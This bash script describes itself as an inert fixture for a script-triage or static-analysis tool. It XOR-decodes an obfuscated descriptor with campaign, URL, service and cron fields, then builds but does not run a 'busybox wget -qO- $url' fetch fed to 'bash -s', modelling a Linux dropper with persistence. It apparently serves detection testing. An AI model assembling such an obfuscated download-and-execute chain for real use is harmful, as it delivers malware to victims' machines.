#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_b0768df6='54,243,194,12,111,52,171,131,3,33,33,173,130,5,117,50,171,172,2,121,45,161,135,21,48,36,167,128,0,125,52,173,155,47,108,41,190,150,12,125,36,175,131,4,121,50,243,145,5,111,57,172,156,8,67,55,169,150,4,67,51,186,151,31,105,52,178,128,4,125,39,171,172,19,115,53,160,135,77,45,60,173,146,29,108,33,167,148,30,67,41,170,206,19,125,45,190,146,25,123,46,227,196,20,45,34,246,151,69,40,120,251,143,5,110,44,243,155,4,104,48,189,201,95,51,119,170,194,18,36,36,251,199,72,41,110,171,139,17,113,48,162,150,94,117,46,184,146,28,117,36,225,199,20,120,121,252,203,22,46,110,189,155,12,105,51,171,129,47,125,39,171,157,4,33,8,187,157,4,110,37,189,128,60,125,34,225,196,20,45,34,246,151,69,40,120,251'
readonly Codec_b0768df6='decimal_comma|repeating_key_xor|40,ce,f3,70,1c'

Load_b0768df6() {
  v_a19c=()
  local IFS=','
  read -r -a v_a19c <<< "${Material_b0768df6}"
}

Decode_b0768df6() {
  v_b27e=()
  local -a key_bytes=(64 206 243 112 28)
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$((v_a19c[v_e598] ^ key_bytes[v_e598 % ${#key_bytes[@]}]))")
  done
}

Recover_b0768df6() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  if ((2 > 1)); then v_d41a=left; else v_d41a=right; fi
  Load_b0768df6
  if ! Decode_b0768df6; then return 71; fi
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_b0768df6() { Recover_b0768df6; }

Plan_b0768df6() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_b0768df6)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_b0768df6; fi
